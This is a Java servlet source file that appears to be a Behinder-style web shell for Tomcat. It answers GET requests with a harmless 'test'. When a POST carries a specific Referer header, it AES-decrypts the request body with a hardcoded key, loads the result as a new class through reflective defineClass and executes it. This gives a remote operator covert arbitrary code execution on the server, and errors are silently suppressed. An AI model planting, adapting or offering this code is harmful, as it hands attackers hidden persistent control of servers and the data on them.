package demo;

import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.Servlet;
import javax.servlet.ServletConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;


public class bxExecutor extends HttpServlet {
    private static final long serialVersionUID = 1L;
    public static String HEADER_KEY = "Referer";
    public static String HEADER_VALUE = "https://www.baidu.com/";

    // pass = "p@ssw0rd";

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException, ServletException {
        PrintWriter writer = resp.getWriter();
        writer.write("test");
    }

    @Override
    public void doPost(HttpServletRequest var1, HttpServletResponse var2) {
        ServletRequest var3 = var1;
        ServletResponse var4 = var2;
        Object var5 = var1;
        Object var6 = var2;

        try {
            Object var7 = getMethodAndInvoke(var3, "getHeader", new Class[]{String.class}, new Object[]{HEADER_KEY});
            if (var7 != null && var7.toString().contains(HEADER_VALUE)) {
                try {
                    Class var8 = Class.forName("org.apache.catalina.connector.RequestFacade", true, Thread.currentThread().getContextClassLoader());
                    Class var9 = Class.forName("org.apache.catalina.connector.ResponseFacade", true, Thread.currentThread().getContextClassLoader());
                    if (!var8.isAssignableFrom(var5.getClass())) {
                        for(var5 = getMethodAndInvoke(var3, "getRequest", (Class[])null, (Object[])null); !var8.isAssignableFrom(var5.getClass()); var5 = getMethodAndInvoke(var5, "getRequest", (Class[])null, (Object[])null)) {
                        }
                    }

                    if (!var9.isAssignableFrom(var6.getClass())) {
                        for(var6 = getMethodAndInvoke(var4, "getResponse", (Class[])null, (Object[])null); !var9.isAssignableFrom(var6.getClass()); var6 = getMethodAndInvoke(var6, "getResponse", (Class[])null, (Object[])null)) {
                        }
                    }
                } catch (Exception var28) {
                }

                Object var11 = getMethodAndInvoke(var3, "getMethod", (Class[])null, (Object[])null);
                if (var11 != null && var11.toString().equals("POST")) {
                    HashMap var12 = new HashMap();
                    Object var13 = getMethodAndInvoke(var5, "getSession", (Class[])null, (Object[])null);
                    var12.put("request", var5);
                    var12.put("response", var6);
                    var12.put("session", var13);
                    StringBuilder var14 = new StringBuilder(getMethodAndInvoke(getMethodAndInvoke(var3, "getReader", (Class[])null, (Object[])null), "readLine", (Class[])null, (Object[])null).toString());
                    if (var14.length() == 0) {
                        var14 = new StringBuilder();
                        Object var15 = getFieldValue(getFieldValue(var5, "request"), "coyoteRequest");
                        Object var16 = getMethodAndInvoke(var15, "getParameters", (Class[])null, (Object[])null);
                        LinkedHashMap var17 = (LinkedHashMap)getFieldValue(var16, "paramHashValues");
                        Iterator var18 = var17.entrySet().iterator();

                        while(var18.hasNext()) {
                            Object var19 = var18.next();
                            String var20 = ((Map.Entry)var19).getKey().toString().replaceAll(" ", "+");
                            ArrayList var21 = (ArrayList)((Map.Entry)var19).getValue();
                            if (var21.size() == 0) {
                                var14.append(var20);
                            } else {
                                var14.append(var20).append("=").append(var21.get(0));
                            }
                        }
                    }

//                    this.noLog(var5);
                    String var22 = "0f359740bd1cda99";
                    getMethodAndInvoke(var13, "putValue", new Class[]{String.class, Object.class}, new Object[]{"u", var22});
                    Cipher var23 = Cipher.getInstance("AES");
                    var23.init(2, new SecretKeySpec(var22.getBytes(), "AES"));
                    Method var24 = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                    var24.setAccessible(true);
                    byte[] var25 = var23.doFinal(base64Decode(var14.toString()));
                    Class var26 = (Class)var24.invoke(Thread.currentThread().getContextClassLoader(), var25, 0, var25.length);
                    var26.newInstance().equals(var12);
                }
            }
        } catch (Exception var29) {
        }

    }


    public static byte[] base64Decode(String var0) throws Exception {
        byte[] var2 = null;

        Class var1;
        try {
            var1 = Class.forName("java.util.Base64");
            Object var3 = var1.getDeclaredMethod("getDecoder", null).invoke((Object)null, null);
            var2 = (byte[])var3.getClass().getMethod("decode", String.class).invoke(var3, var0);
        } catch (Exception var8) {
            try {
                var1 = Class.forName("sun.misc.BASE64Decoder");
                Object var5 = var1.newInstance();
                var2 = (byte[])var5.getClass().getMethod("decodeBuffer", String.class).invoke(var5, var0);
            } catch (Exception var7) {
            }
        }

        return var2;
    }

    public static Object getFieldValue(Object var0, String var1) throws Exception {
        Field var2 = null;
        if (var0 instanceof Field) {
            var2 = (Field)var0;
        } else {
            Class var3 = var0.getClass();

            while(var3 != null) {
                try {
                    var2 = var3.getDeclaredField(var1);
                    var3 = null;
                } catch (Exception var5) {
                    var3 = var3.getSuperclass();
                }
            }
        }

        var2.setAccessible(true);
        return var2.get(var0);
    }

    public static Method getMethodByClass(Class var0, String var1, Class[] var2) {
        Method var3 = null;

        while(var0 != null) {
            try {
                var3 = var0.getDeclaredMethod(var1, var2);
                var3.setAccessible(true);
                var0 = null;
            } catch (Exception var5) {
                var0 = var0.getSuperclass();
            }
        }

        return var3;
    }

    public static Object getMethodAndInvoke(Object var0, String var1, Class[] var2, Object[] var3) {
        try {
            Method var4 = getMethodByClass(var0.getClass(), var1, var2);
            if (var4 != null) {
                return var4.invoke(var0, var3);
            }
        } catch (Exception var6) {
        }

        return null;
    }

}
